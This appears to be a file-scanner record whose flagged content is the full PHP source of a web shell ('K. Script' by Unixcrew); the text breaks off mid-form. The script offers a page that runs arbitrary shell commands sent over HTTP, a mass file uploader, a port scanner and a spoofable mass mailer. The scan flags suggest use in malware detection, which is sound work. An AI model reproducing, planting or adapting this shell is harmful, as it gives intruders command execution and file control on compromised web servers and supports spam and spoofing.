{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "OPEN": "May open a file",
            "System": "May run an executable file or a system command on a Mac",
            "call": "May call a DLL using Excel 4 Macros",
            "command": "May run PowerShell commands",
            "output": "May write to a file",
            "shell": "May run an executable file or a system command",
            "windows": "May enumerate application windows"
        },
        "macro": "<?php\n/* <Settings> */\n$Title = \"K. Script v0.3 Beta By Unixcrew: \";\n$GraphicHeader = '<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1257\">\n\t<style type=\"text/css\">\n\t\tbody{\n\t\t\tbackground-color: #F6F6F6;\n\t\t\ttext-align: center;\n\t\t\twidth: 100%;\n\t\t\tpadding: 0px;\n\t\t\tmargin: 0px;\n\t\t}\n\t\t#unCenter{\n\t\t\twidth: 300px;\n\t\t\tmargin-left: auto;\n\t\t\tmargin-right: auto;\n\t\t\ttext-align: left;\n\t\t}\n\t\t#unCenterShell{\n\t\t\t\t\twidth: 500px;\n\t\t\t\t\tmargin-left: auto;\n\t\t\t\t\tmargin-right: auto;\n\t\t\ttext-align: left;\n\t\t}\n\t\t#unCenterShell{\n\t\t\t\t\twidth: 700px;\n\t\t\t\t\tmargin-left: auto;\n\t\t\t\t\tmargin-right: auto;\n\t\t}\n\t\t.Marged{\n\t\t\tmargin-top: 20px;\n\t\t}\n\t\t.Input{\n\t\tborder: 1px solid #DADADA;\n\t\t}\n\t\t.Table{\n\t\t\tborder: 1px solid #DADADA;\n\t\t\tbackground-color: White;\n\t\t\tpadding: 10px;\n\t\t\tfont: 11px Tahoma, Verdana, sans-serif;\n\t\t\tline-height: 17px;\n\t\t\tcolor: Gray;\n\t\t}\n\t\ta{\n\t\t\ttext-decoration: none;\n\t\t\tcolor: #003473;\n\t\t}\n\t\ta:hover{\n\t\t\ttext-decoration: none;\n\t\t\tcolor: #F5822B;\n\t\t}\n\t\timg{\n\t\t\tborder: 0px;\n\t\t}\n\t\th1{\n\t\t\tfont-size: 14px;\n\t\t\tfont-weight: bold;\n\t\t\tpadding: 0px;\n\t\t\tmargin-bottom: 7px;\n\t\t}\n\n\t\t.Black{\n\t\t\tcolor: Gray;\n\t\t\tfont: 11px Tahoma, Verdana, sans-serif;\n\t\t}\n\t\t.BlackRealy{\n\t\t\tcolor: Black;\n\t\t\tfont: 12px Tahoma, Verdana, sans-serif;\n\t\t}\n\t</style>';\n\n\t$SiteHeader = '</head><body><br>\n\t<a href=\"?MainPage\"><img src=\"http://kileris.net/images/fuck.gif\" width=\"50\" height=\"50\" alt=\"Home\"></a><hr width=\"90%\">';\n\n\t$GraphicFooter = '<hr width=\"90%\">\n\t<div align=\"center\" class=\"black\">[<a href=\"?Uploader\">FileUploader</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?PHPShell\">PHPShell</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?PortCheck\">PortCheck</a><span class=\"BlackRealy\">  |  </span>[<a href=\"?Mailer\">MassMailer</a>]<span class=\"BlackRealy\">  |  </span>[<a href=\"?DeleteMe\">Delete Me</a>]</div>\n<div><img width=\"1\" height=\"1\" ></div>\n\t<div align=\"center\" class=\"Black\">Copyright &copy; 2005 <a href=\"mailto:Gadamnit@gmail.com\">Unixcrew</a></div>\n</body></html>';\n/* </Settings> */\n\nif ($_SERVER['QUERY_STRING'] == '') {\nheader(\"Location: http://\" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . \"?MainPage\");\n}\n\nif(isset($_GET['PHPShell'])) {\n/* <ShellScript> */\n$passwd = array();\n$aliases = array();\n\nsession_start();\nif (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {\n    $_SESSION['cwd'] = getcwd();\n    $_SESSION['history'] = array();\n    $_SESSION['output'] = '';\n  }\n\n  if (!empty($_REQUEST['command'])) {\n    if (get_magic_quotes_gpc()) {\n      $_REQUEST['command'] = stripslashes($_REQUEST['command']);\n    }\n\n   if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)\n      unset($_SESSION['history'][$i]);\n\n    array_unshift($_SESSION['history'], $_REQUEST['command']);\n\n    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . \"\\n\";\n\n    /* Initialize the current working directory. */\n    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {\n      $_SESSION['cwd'] = dirname(__FILE__);\n    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {\n      /* The current command is a 'cd' command which we have to handle\n       * as an internal shell command. */\n\n      if ($regs[1][0] == '/') {\n        /* Absolute path, we use it unchanged. */\n        $new_dir = $regs[1];\n      } else {\n        /* Relative path, we append it to the current working\n         * directory. */\n        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];\n      }\n\n      /* Transform '/./' into '/' */\n      while (strpos($new_dir, '/./') !== false)\n        $new_dir = str_replace('/./', '/', $new_dir);\n\n      /* Transform '//' into '/' */\n      while (strpos($new_dir, '//') !== false)\n        $new_dir = str_replace('//', '/', $new_dir);\n\n      /* Transform 'x/..' into '' */\n      while (preg_match('|/\\.\\.(?!\\.)|', $new_dir))\n        $new_dir = preg_replace('|/?[^/]+/\\.\\.(?!\\.)|', '', $new_dir);\n\n      if ($new_dir == '') $new_dir = '/';\n\n      /* Try to change directory. */\n      if (@chdir($new_dir)) {\n        $_SESSION['cwd'] = $new_dir;\n      } else {\n        $_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";\n      }\n\n    } else {\n      /* The command is not a 'cd' command, so we execute it after\n       * changing the directory and save the output. */\n      chdir($_SESSION['cwd']);\n\n      /* Alias expansion. */\n      $length = strcspn($_REQUEST['command'], \" \\t\");\n      $token = substr($_REQUEST['command'], 0, $length);\n      if (isset($aliases[$token]))\n        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);\n\n      $p = proc_open($_REQUEST['command'],\n                     array(1 => array('pipe', 'w'),\n                           2 => array('pipe', 'w')),\n                     $io);\n\n      /* Read output sent to stdout. */\n      while (!feof($io[1])) {\n        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),\n                                                ENT_COMPAT, 'UTF-8');\n      }\n      /* Read output sent to stderr. */\n      while (!feof($io[2])) {\n        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),\n                                                ENT_COMPAT, 'UTF-8');\n      }\n\n      fclose($io[1]);\n      fclose($io[2]);\n      proc_close($p);\n    }\n  }\n\n  /* Build the command history for use in the JavaScript */\n  if (empty($_SESSION['history'])) {\n    $js_command_hist = '\"\"';\n  } else {\n    $escaped = array_map('addslashes', $_SESSION['history']);\n    $js_command_hist = '\"\", \"' . implode('\", \"', $escaped) . '\"';\n  }\n\n\necho '<xml version=\"1.0\" encoding=\"UTF-8\">';\necho '<html><head><title>'.$Title.' PHPShell</title>';\necho $GraphicHeader;\n?>\n<!-- </ShellScript> -->\n\n\n<!-- <ShellGraphic> -->\n\n\n<script type=\"text/javascript\" language=\"JavaScript\">\n  var current_line = 0;\n  var command_hist = new Array(<?php echo $js_command_hist ?>);\n  var last = 0;\n\n  function key(e) {\n    if (!e) var e = window.event;\n\n    if (e.keyCode == 38 && current_line < command_hist.length-1) {\n      command_hist[current_line] = document.shell.command.value;\n      current_line++;\n      document.shell.command.value = command_hist[current_line];\n    }\n\n    if (e.keyCode == 40 && current_line > 0) {\n      command_hist[current_line] = document.shell.command.value;\n      current_line--;\n      document.shell.command.value = command_hist[current_line];\n    }\n\n  }\n\nfunction init() {\n  document.shell.setAttribute(\"autocomplete\", \"off\");\n  document.shell.output.scrollTop = document.shell.output.scrollHeight;\n  document.shell.command.focus();\n}\n\n  </script>\n<? echo $SiteHeader; ?>\n\n<body onload=\"init()\">\n<?php\nerror_reporting (E_ALL);\nif (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 10;\n?>\n<div id=\"unCenterShell\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div>Current Directory: <?php echo $_SESSION['cwd'] ?></div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n\n<div id=\"unCenterShell\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div><form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ..'?PHPShell'?>\" method=\"post\"></div>\n\t\t\t<div>\n\t<textarea class=\"Input\" name=\"output\" readonly=\"readonly\" cols=\"55\" rows=\"<?php echo $_REQUEST['rows'] ?>\">\n\t<?php\n\t$lines = substr_count($_SESSION['output'], \"\\n\");\n\t$padding = str_repeat(\"\\n\", max(0, $_REQUEST['rows']+1 - $lines));\n\techo rtrim($padding . $_SESSION['output']);\n\t?>\n\t</textarea>\n\t\t\t</div>\n\t<div>$&nbsp;&nbsp;<input class=\"Input\" name=\"command\" type=\"text\" onkeyup=\"key(event)\" size=\"72\" tabindex=\"1\"><div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n\n\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div><input type=\"submit\" value=\"Execute Command\" />&nbsp;<input type=\"submit\" name=\"reset\" value=\"Reset\" /></div>\n\t\t\t<div>Rows: <input type=\"text\" name=\"rows\" value=\"<?php echo $_REQUEST['rows'] ?>\" /></div>\n\t\t</form>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n<!-- </ShellGraphic> -->\n<? echo $GraphicFooter; } ?>\n\n\n<? if(isset($_GET['Uploader'])){\necho '<html><head><title>'.$Title.' Uploader</title>';\necho $GraphicHeader; echo $SiteHeader;  ?>\n<!-- <MassUploaderScript> -->\n<?php\nif(isset($_POST['upl_files'])){\n  echo '<div id=\"unCenter\"><div class=\"Marged\"><div class=\"Table\">\n\t\t<div>Uploaded Files:<br></div>';\n  //print_r($_FILES['file_n']);\n  $up_mas = $_FILES['file_n'];\n  $mas_name = array();\n  $mas_tmp = array();\n  for($i=0; $i<10; $i++){\n    if(!empty($up_mas['name'][$i])){\n      $j = count($mas_name);\n      $mas_name[$j] = $up_mas['name'][$i];\n      $mas_tmp[$j] = $up_mas['tmp_name'][$i];\n      }\n    }\n  for($i=0; $i<count($mas_name); $i++){\n    $upl_file = './'.$mas_name[$i];\n    if(move_uploaded_file($mas_tmp[$i], $upl_file)){\n      echo '<a href=\"'.$mas_name[$i].'\">'.$mas_name[$i].'</a>,&nbsp';\n      }\n    }\n  }\necho \"</div></div></div>\";\n?>\n<!-- </MassUploaderScript> -->\n\n<!-- <MassUploaderGraphic> -->\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<br>\n\t\t\t<form enctype=\"multipart/form-data\" method=\"post\" action=\"\">\n\t\t\t<div>\n\t\t\t<?php\n \t\t for($i=0; $i<10; $i++){\n  \t\t  echo '<div><input class=\"Input\" type=\"file\" name=\"file_n[]\"></div>';\n  \t\t  } ?>\n  \t\t  </div>\n  \t\t  <div><input type=\"reset\" name=\"reset\" value=\"Reset\">&nbsp;<input type=\"submit\" name=\"upl_files\" value=\"upload\"></div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n<!-- </MassUploaderGraphic> -->\n<? echo $GraphicFooter; } ?>\n\n\n<? if(isset($_GET['MainPage'])){\necho '<html><head><title>'.$Title.'</title>';\necho $GraphicHeader; echo $SiteHeader; ?>\n<!-- <MainPageGraphic> -->\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div></div>\n\t\t\t<div><a href=\"?Uploader\">FileUploader</a></div>\n\t\t\t<div><a href=\"?PHPShell\">PHPShell</a></div>\n\t\t\t<div><a href=\"?PortCheck\">PortCheck</a></div>\n\t\t\t<div><a href=\"?Mailer\">MassMailer</a></div>\n\t\t\t<div><hr width=\"200\"></div>\n\t\t\t<div><a href=\"?DeleteMe\">Delete me</a></div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n<!-- <MainPageGraphic> -->\n<? echo $GraphicFooter; } ?>\n\n<!-- <PortCheck> -->\n<? if(isset($_GET['PortCheck'])) {\necho '<html><head><title>'.$Title.' PortCheck</title>';\necho $GraphicHeader; echo $SiteHeader;\n\n$ip = getenv (\"REMOTE_ADDR\");\n$client_ip = getenv (\"HTTP_CLIENT_IP\");\n$forward = getenv (\"HTTP_X_FORWARDED_FOR\");\n$via = getenv (\"HTTP_VIA\");\n\nif (($ip == $client_ip) || ($client_ip == NULL)) {\n    $host = $ip;\n} else if (($via) || ($forward)) {\n    $host = $client_ip;\n}\n\nif( $_GET['port'] == \"\") {\n$ports=\"20 21 22 23 25 37 53 67 79 80 110 137 138 139 143 443 993 995 2082 1080 8080 8181\";\n} else {\n$ports=$_GET['port'];\n}\n\n$arr[1] = \"tcpmux (TCP Port Service Multiplexer)\";\n$arr[2] = \"Management Utility\";\n$arr[3] = \"Compression Process\";\n$arr[5] = \"rje (Remote Job Entry)\";\n$arr[7] = \"echo\";\n$arr[9] = \"discard\";\n$arr[11] = \"systat\";\n$arr[13] = \"daytime\";\n$arr[15] = \"netstat\";\n$arr[17] = \"quote of the day\";\n$arr[18] = \"send/rwp\";\n$arr[19] = \"character generator\";\n$arr[20] = \"ftp-data\";\n$arr[21] = \"ftp\";\n$arr[22] = \"ssh, pcAnywhere\";\n$arr[23] = \"Telnet\";\n$arr[25] = \"SMTP (Simple Mail Transfer)\";\n$arr[27] = \"ETRN (NSW User System FE)\";\n$arr[29] = \"MSG ICP\";\n$arr[31] = \"MSG Authentication\";\n$arr[33] = \"dsp (Display Support Protocol)\";\n$arr[37] = \"time\";\n$arr[38] = \"RAP (Route Access Protocol)\";\n$arr[39] = \"rlp (Resource Location Protocol)\";\n$arr[41] = \"Graphics\";\n$arr[42] = \"nameserv, WINS\";\n$arr[43] = \"whois, nickname\";\n$arr[44] = \"MPM FLAGS Protocol\";\n$arr[45] = \"Message Processing Module [recv]\";\n$arr[46] = \"MPM [default send]\";\n$arr[47] = \"NI FTP\";\n$arr[48] = \"Digital Audit Daemon\";\n$arr[49] = \"TACACS, Login Host Protocol\";\n$arr[50] = \"RMCP, re-mail-ck\";\n$arr[53] = \"DNS\";\n$arr[57] = \"MTP (any private terminal access)\";\n$arr[59] = \"NFILE\";\n$arr[60] = \"Unassigned\";\n$arr[61] = \"NI MAIL\";\n$arr[62] = \"ACA Services\";\n$arr[63] = \"whois++\";\n$arr[64] = \"Communications Integrator (CI)\";\n$arr[65] = \"TACACS-Database Service\";\n$arr[66] = \"Oracle SQL*NET\";\n$arr[67] = \"bootps (Bootstrap Protocol Server)\";\n$arr[68] = \"bootpd/dhcp (Bootstrap Protocol Client)\";\n$arr[69] = \"Trivial File Transfer Protocol (tftp)\";\n$arr[70] = \"Gopher\";\n$arr[71] = \"Remote Job Service\";\n$arr[72] = \"Remote Job Service\";\n$arr[73] = \"Remote Job Service\";\n$arr[74] = \"Remote Job Service\";\n$arr[75] = \"any private dial out service\";\n$arr[76] = \"Distributed External Object Store\";\n$arr[77] = \"any private RJE service\";\n$arr[78] = \"vettcp\";\n$arr[79] = \"finger\";\n$arr[80] = \"World Wide Web HTTP\";\n$arr[81] = \"HOSTS2 Name Serve\";\n$arr[82] = \"XFER Utility\";\n$arr[83] = \"MIT ML Device\";\n$arr[84] = \"Common Trace Facility\";\n$arr[85] = \"MIT ML Device\";\n$arr[86] = \"Micro Focus Cobol\";\n$arr[87] = \"any private terminal link\";\n$arr[88] = \"Kerberos, WWW\";\n$arr[89] = \"SU/MIT Telnet Gateway\";\n$arr[90] = \"DNSIX Securit Attribute Token Map\";\n$arr[91] = \"MIT Dover Spooler\";\n$arr[92] = \"Network Printing Protocol\";\n$arr[93] = \"Device Control Protocol\";\n$arr[94] = \"Tivoli Object Dispatcher\";\n$arr[95] = \"supdup\";\n$arr[96] = \"DIXIE\";\n$arr[98] = \"linuxconf\";\n$arr[99] = \"Metagram Relay\";\n$arr[100] = \"[unauthorized use]\";\n$arr[101] = \"HOSTNAME\";\n$arr[102] = \"ISO, X.400, ITOT\";\n$arr[103] = \"Genesis Point-to&#14144;&#429;oi&#65535;&#65535; T&#0;&#0;ns&#0;&#0;et\";\n$arr[104] = \"ACR-NEMA Digital Imag. & Comm. 300\";\n$arr[105] = \"CCSO name server protocol\";\n$arr[106] = \"poppassd\";\n$arr[107] = \"Remote Telnet Service\";\n$arr[108] = \"SNA Gateway Access Server\";\n$arr[109] = \"POP2\";\n$arr[110] = \"POP3\";\n$arr[111] = \"Sun RPC Portmapper\";\n$arr[112] = \"McIDAS Data Transmission Protocol\";\n$arr[113] = \"Authentication Service\";\n$arr[115] = \"sftp (Simple File Transfer Protocol)\";\n$arr[116] = \"ANSA REX Notify\";\n$arr[117] = \"UUCP Path Service\";\n$arr[118] = \"SQL Services\";\n$arr[119] = \"NNTP\";\n$arr[120] = \"CFDP\";\n$arr[123] = \"NTP\";\n$arr[124] = \"SecureID\";\n$arr[129] = \"PWDGEN\";\n$arr[133] = \"statsrv\";\n$arr[135] = \"loc-srv/epmap\";\n$arr[137] = \"netbios-ns\";\n$arr[138] = \"netbios-dgm (UDP)\";\n$arr[139] = \"NetBIOS\";\n$arr[143] = \"IMAP\";\n$arr[144] = \"NewS\";\n$arr[150] = \"SQL-NET\";\n$arr[152] = \"BFTP\";\n$arr[153] = \"SGMP\";\n$arr[156] = \"SQL Service\";\n$arr[161] = \"SNMP\";\n$arr[175] = \"vmnet\";\n$arr[177] = \"XDMCP\";\n$arr[178] = \"NextStep Window Server\";\n$arr[179] = \"BGP\";\n$arr[180] = \"SLmail admin\";\n$arr[199] = \"smux\";\n$arr[210] = \"Z39.50\";\n$arr[213] = \"IPX\";\n$arr[218] = \"MPP\";\n$arr[220] = \"IMAP3\";\n$arr[256] = \"RAP\";\n$arr[257] = \"Secure Electronic Transaction\";\n$arr[258] = \"Yak Winsock Personal Chat\";\n$arr[259] = \"ESRO\";\n$arr[264] = \"FW1_topo\";\n$arr[311] = \"Apple WebAdmin\";\n$arr[350] = \"MATIP type A\";\n$arr[351] = \"MATIP type B\";\n$arr[363] = \"RSVP tunnel\";\n$arr[366] = \"ODMR (On-Demand Mail Relay)\";\n$arr[371] = \"Clearcase\";\n$arr[387] = \"AURP (AppleTalk Update-Based Routing Protocol)\";\n$arr[389] = \"LDAP\";\n$arr[407] = \"Timbuktu\";\n$arr[427] = \"Server Location\";\n$arr[434] = \"Mobile IP\";\n$arr[443] = \"ssl\";\n$arr[444] = \"snpp, Simple Network Paging Protocol\";\n$arr[445] = \"SMB\";\n$arr[458] = \"QuickTime TV/Conferencing\";\n$arr[468] = \"Photuris\";\n$arr[475] = \"tcpnethaspsrv\";\n$arr[500] = \"ISAKMP, pluto\";\n$arr[511] = \"mynet-as\";\n$arr[512] = \"biff, rexec\";\n$arr[513] = \"who, rlogin\";\n$arr[514] = \"syslog, rsh\";\n$arr[515] = \"lp, lpr, line printer\";\n$arr[517] = \"talk\";\n$arr[520] = \"RIP (Routing Information Protocol)\";\n$arr[521] = \"RIPng\";\n$arr[522] = \"ULS\";\n$arr[531] = \"IRC\";\n$arr[543] = \"KLogin, AppleShare over IP\";\n$arr[545] = \"QuickTime\";\n$arr[548] = \"AFP\";\n$arr[554] = \"Real Time Streaming Protocol\";\n$arr[555] = \"phAse Zero\";\n$arr[563] = \"NNTP over SSL\";\n$arr[575] = \"VEMMI\";\n$arr[581] = \"Bundle Discovery Protocol\";\n$arr[593] = \"MS-RPC\";\n$arr[608] = \"SIFT/UFT\";\n$arr[626] = \"Apple ASIA\";\n$arr[631] = \"IPP (Internet Printing Protocol)\";\n$arr[635] = \"RLZ DBase\";\n$arr[636] = \"sldap\";\n$arr[642] = \"EMSD\";\n$arr[648] = \"RRP (NSI Registry Registrar Protocol)\";\n$arr[655] = \"tinc\";\n$arr[660] = \"Apple MacOS Server Admin\";\n$arr[666] = \"Doom\";\n$arr[674] = \"ACAP\";\n$arr[687] = \"AppleShare IP Registry\";\n$arr[700] = \"buddyphone\";\n$arr[705] = \"AgentX for SNMP\";\n$arr[901] = \"swat, realsecure\";\n$arr[993] = \"s-imap\";\n$arr[995] = \"s-pop\";\n$arr[1024] = \"Reserved\";\n$arr[1025] = \"network blackjack\";\n$arr[1062] = \"Veracity\";\n$arr[1080] = \"SOCKS\";\n$arr[1085] = \"WebObjects\";\n$arr[1227] = \"DNS2Go\";\n$arr[1243] = \"SubSeven\";\n$arr[1338] = \"Millennium Worm\";\n$arr[1352] = \"Lotus Notes\";\n$arr[1381] = \"Apple Network License Manager\";\n$arr[1417] = \"Timbuktu Service 1 Port\";\n$arr[1418] = \"Timbuktu Service 2 Port\";\n$arr[1419] = \"Timbuktu Service 3 Port\";\n$arr[1420] = \"Timbuktu Service 4 Port\";\n$arr[1433] = \"Microsoft SQL Server\";\n$arr[1434] = \"Microsoft SQL Monitor\";\n$arr[1477] = \"ms-sna-server\";\n$arr[1478] = \"ms-sna-base\";\n$arr[1490] = \"insitu-conf\";\n$arr[1494] = \"Citrix ICA Protocol\";\n$arr[1498] = \"Watcom-SQL\";\n$arr[1500] = \"VLSI License Manager\";\n$arr[1503] = \"T.120\";\n$arr[1521] = \"Oracle SQL\";\n$arr[1522] = \"Ricardo North America License Manager\";\n$arr[1524] = \"ingres\";\n$arr[1525] = \"prospero\";\n$arr[1526] = \"prospero\";\n$arr[1527] = \"tlisrv\";\n$arr[1529] = \"oracle\";\n$arr[1547] = \"laplink\";\n$arr[1604] = \"Citrix ICA, MS Terminal Server\";\n$arr[1645] = \"RADIUS Authentication\";\n$arr[1646] = \"RADIUS Accounting\";\n$arr[1680] = \"Carbon Copy\";\n$arr[1701] = \"L2TP/LSF\";\n$arr[1717] = \"Convoy\";\n$arr[1720] = \"H.323/Q.931\";\n$arr[1723] = \"PPTP control port\";\n$arr[1731] = \"MSICCP\";\n$arr[1755] = \"Windows Media .asf\";\n$arr[1758] = \"TFTP multicast\";\n$arr[1761] = \"cft-0\";\n$arr[1762] = \"cft-1\";\n$arr[1763] = \"cft-2\";\n$arr[1764] = \"cft-3\";\n$arr[1765] = \"cft-4\";\n$arr[1766] = \"cft-5\";\n$arr[1767] = \"cft-6\";\n$arr[1808] = \"Oracle-VP2\";\n$arr[1812] = \"RADIUS server\";\n$arr[1813] = \"RADIUS accounting\";\n$arr[1818] = \"ETFTP\";\n$arr[1973] = \"DLSw DCAP/DRAP\";\n$arr[1985] = \"HSRP\";\n$arr[1999] = \"Cisco AUTH\";\n$arr[2001] = \"glimpse\";\n$arr[2049] = \"NFS\";\n$arr[2064] = \"distributed.net\";\n$arr[2065] = \"DLSw\";\n$arr[2066] = \"DLSw\";\n$arr[2106] = \"MZAP\";\n$arr[2140] = \"DeepThroat\";\n$arr[2301] = \"Compaq Insight Management Web Agents\";\n$arr[2327] = \"Netscape Conference\";\n$arr[2336] = \"Apple UG Control\";\n$arr[2427] = \"MGCP gateway\";\n$arr[2504] = \"WLBS\";\n$arr[2535] = \"MADCAP\";\n$arr[2543] = \"sip\";\n$arr[2592] = \"netrek\";\n$arr[2727] = \"MGCP call agent\";\n$arr[2628] = \"DICT\";\n$arr[2998] = \"ISS Real Secure Console Service Port\";\n$arr[3000] = \"Firstclass\";\n$arr[3001] = \"Redwood Broker\";\n$arr[3031] = \"Apple AgentVU\";\n$arr[3128] = \"squid\";\n$arr[3130] = \"ICP\";\n$arr[3150] = \"DeepThroat\";\n$arr[3264] = \"ccmail\";\n$arr[3283] = \"Apple NetAssitant\";\n$arr[3288] = \"COPS\";\n$arr[3305] = \"ODETTE\";\n$arr[3306] = \"mySQL\";\n$arr[3389] = \"RDP Protocol (Terminal Server)\";\n$arr[3521] = \"netrek\";\n$arr[4000] = \"icq, command-n-conquer\";\n$arr[4321] = \"rwhois\";\n$arr[4333] = \"mSQL\";\n$arr[4444] = \"KRB524\";\n$arr[4827] = \"HTCP\";\n$arr[5002] = \"radio free ethernet\";\n$arr[5004] = \"RTP\";\n$arr[5005] = \"RTP\";\n$arr[5010] = \"Yahoo! Messenger\";\n$arr[5050] = \"multimedia conference control tool\";\n$arr[5060] = \"SIP\";\n$arr[5150] = \"Ascend Tunnel Management Protocol\";\n$arr[5190] = \"AIM\";\n$arr[5500] = \"securid\";\n$arr[5501] = \"securidprop\";\n$arr[5423] = \"Apple VirtualUser\";\n$arr[5555] = \"Personal Agent\";\n$arr[5631] = \"PCAnywhere data\";\n$arr[5632] = \"PCAnywhere\";\n$arr[5678] = \"Remote Replication Agent Connection\";\n$arr[5800] = \"VNC\";\n$arr[5801] = \"VNC\";\n$arr[5900] = \"VNC\";\n$arr[5901] = \"VNC\";\n$arr[6000] = \"X Windows\";\n$arr[6112] = \"BattleNet\";\n$arr[6502] = \"Netscape Conference\";\n$arr[6667] = \"IRC\";\n$arr[6670] = \"VocalTec Internet Phone, DeepThroat\";\n$arr[6699] = \"napster\";\n$arr[6776] = \"Sub7\";\n$arr[6970] = \"RTP\";\n$arr[7007] = \"MSBD, Windows Media encoder\";\n$arr[7070] = \"RealServer/QuickTime\";\n$arr[7777] = \"cbt\";\n$arr[7778] = \"Unreal\";\n$arr[7648] = \"CU-SeeMe\";\n$arr[7649] = \"CU-SeeMe\";\n$arr[8000] = \"iRDMI/Shoutcast Server\";\n$arr[8010] = \"WinGate 2.1\";\n$arr[8080] = \"HTTP\";\n$arr[8181] = \"HTTP\";\n$arr[8383] = \"IMail WWW\";\n$arr[8875] = \"napster\";\n$arr[8888] = \"napster\";\n$arr[8889] = \"Desktop Data TCP 1\";\n$arr[8890] = \"Desktop Data TCP 2\";\n$arr[8891] = \"Desktop Data TCP 3: NESS application\";\n$arr[8892] = \"Desktop Data TCP 4: FARM product\";\n$arr[8893] = \"Desktop Data TCP 5: NewsEDGE/Web application\";\n$arr[8894] = \"Desktop Data TCP 6: COAL application\";\n$arr[9000] = \"CSlistener\";\n$arr[10008] = \"cheese worm\";\n$arr[11371] = \"PGP 5 Keyserver\";\n$arr[13223] = \"PowWow\";\n$arr[13224] = \"PowWow\";\n$arr[14237] = \"Palm\";\n$arr[14238] = \"Palm\";\n$arr[18888] = \"LiquidAudio\";\n$arr[21157] = \"Activision\";\n$arr[22555] = \"Vocaltec Web Conference\";\n$arr[23213] = \"PowWow\";\n$arr[23214] = \"PowWow\";\n$arr[23456] = \"EvilFTP\";\n$arr[26000] = \"Quake\";\n$arr[27001] = \"QuakeWorld\";\n$arr[27010] = \"Half-Life\";\n$arr[27015] = \"Half-Life\";\n$arr[27960] = \"QuakeIII\";\n$arr[30029] = \"AOL Admin\";\n$arr[31337] = \"Back Orifice\";\n$arr[32777] = \"rpc.walld\";\n$arr[45000] = \"Cisco NetRanger postofficed\";\n$arr[32773] = \"rpc bserverd\";\n$arr[32776] = \"rpc.spray\";\n$arr[32779] = \"rpc.cmsd\";\n$arr[38036] = \"timestep\";\n$arr[40193] = \"Novell\";\n$arr[41524] = \"arcserve discovery\";\n$arr[2082] = \"cPanel\";\n\nif($arr[$port]==\"\"){\n$arr[$port] = \"Unknown Port\";\n}\n\nprint \"<div id=\\\"unCenter\\\"><div class=\\\"Marged\\\"><div class=\\\"Table\\\" style=\\\"padding-left: 20\\\">\";\n\n$portcont=0;\nforeach(explode(\" \",\"$ports\") as $port) {\n     $portcont++;\n     if ($portcont < 30 ) {\n     if ( is_numeric($port) ) {\n     $fp = @fsockopen($host,$port,$errno,$errstr,3);\n     if(!$fp)\n     {\n         print \"<div>$port | <span style=\\\"color: RED;\\\">CLOSE</span> |\";\n     }\n     else\n     {\n         print \"<div>$port | <span style=\\\"color: GREEN;\\\">OPEN</span>  |\";\n         fclose($fp);\n    }\n    print \" $arr[$port]</div>\";\n    flush();\n    }else{\n       print \"Error a $port. Not valid.\";\n    }\n  }\n}\nprint \"</div></div></div>\";\n?>\n\n</table>\n<div id=\"unCenter\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n\t\t\t<center>\n\t\t\t<div>Other Port (enter for check):<br></div>\n\t\t\t<div><form action=\"<? echo $_SERVER['PHP_SELF'] . '?PortCheck&port' ?>\" method=\"GET\"></div>\n\t\t\t<div><input type=\"text\" name=\"port\">&nbsp;<input type=\"submit\" value=\"Scan\"></div>\n\t\t\t</center>\n\t\t</div>\n\t</div>\n</div>\n<!-- </PortCheck> -->\n<? echo $GraphicFooter; } ?>\n\n<? if(isset($_GET['Mailer'])) {\necho '<html><head><title>'.$Title.' Mailer</title>';\necho $GraphicHeader;\necho $SiteHeader;\n\nif ($action==\"send\"){\n\t$message = urlencode($message);\n\t$message = ereg_replace(\"%5C%22\", \"%22\", $message);\n\t$message = urldecode($message);\n\t$message = stripslashes($message);\n\t$subject = stripslashes($subject);\n}\n?>\n<!-- Mailer -->\n<form name=\"Mailer\" method=\"post\" action=\"<? echo $_SERVER['PHP_SELF'] . '?Mailer' ?>\" enctype=\"multipart/form-data\">\n\n<div id=\"unCenterShell\">\n\t<div class=\"Marged\">\n\t\t<div class=\"Table\">\n <div align=\"left\">\n\t<div style=\"padding-left: 20px;\">Your Email: <input class=\"input\" type=\"text\" name=\"from\" value=\"\" size=\"20\">\n\t<span style=\"padding-left: 122px;\"></span>Your Name: <input class=\"input\" type=\"text\" name=\"realname\" value=\"\" size=\"20\"></div>\n\t<div style=\"padding-left: 26px;\">Reply-To: <input class=\"input\" type=\"text\" name=\"replyto\" value=\"\" size=\"20\">\n\t<span style=\"padding-left: 123px;\"></span>Attach File: <input class=\"input\" type=\"file\" name=\"file\" 